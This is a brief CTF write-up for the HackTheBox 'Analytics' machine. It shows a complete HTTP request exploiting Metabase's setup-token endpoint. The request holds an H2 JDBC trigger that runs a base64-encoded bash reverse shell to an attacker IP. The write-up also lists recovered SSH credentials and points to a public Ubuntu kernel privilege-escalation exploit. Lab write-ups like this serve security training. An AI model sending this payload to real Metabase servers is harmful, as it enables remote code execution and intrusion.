# Analytics

## Intro

Analytics is an easy linux box from HackTheBox.

## User

Metabase setup token is accessible from the following.  

```
http://data.analytical.htb/api/session/properties
```

Payload reverse shell.  

```
POST /api/setup/validate HTTP/1.1
Host: data.analytical.htb
Content-Type: application/json
Content-Length: 818

{
    "token": "249fa03d-fd94-4d5b-b94f-b4ebf3df681f",
    "details":
    {
        "is_on_demand": false,
        "is_full_sync": false,
        "is_sample": false,
        "cache_ttl": null,
        "refingerprint": false,
        "auto_run_queries": true,
        "schedules":
        {},
        "details":
        {
            "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo,c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMzcvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}')\n$$--=x",
            "advanced-options": false,
            "ssl": true
        },
        "name": "an-sec-research-team",
        "engine": "h2"
    }
}
```

## Credentials

User

```
metalytics
```

Password

```
An4lytics_ds20223#
```

The above credentials are able to ssh into the box and not the container.  

## root

Ubuntu linux kernel 6.2.0 is vulnerable.  

```
https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629
```
